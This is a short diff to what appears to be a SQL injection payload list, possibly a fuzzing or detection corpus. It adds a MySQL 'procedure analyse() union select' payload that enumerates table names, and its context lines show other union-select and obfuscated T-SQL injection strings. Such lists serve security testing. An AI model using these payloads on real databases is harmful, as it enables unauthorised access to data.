@@ -560,3 +560,6 @@ binary (binary 1) union select table_name from information_schema.tables
 
 # more weird T-SQL weirdness
 \%0=\-1AND\*1=\/1
+
+# mysql
+-1 procedure analyse() union select table_name from information_schema.tables limit 1
